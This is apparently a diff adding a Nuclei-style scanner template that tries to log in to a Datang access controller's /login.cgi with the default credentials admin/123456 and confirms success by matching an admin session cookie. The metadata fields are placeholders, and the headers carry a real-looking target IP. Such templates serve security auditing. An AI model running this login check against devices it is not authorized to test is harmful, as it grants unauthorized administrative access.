@@ -1,0 +1,36 @@
+id: datangac-default-login
+info:
+  name: datangac-default-login
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 126
+        Origin: http://106.80.153.199:800
+        Connection: close
+        Referer: http://106.80.153.199:800/login.html
+        Upgrade-Insecure-Requests: 1
+
+        user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - index.htm?
+      - type: word
+        part: header
+        words:
+          - ac_userid=admin,ac_passwd=
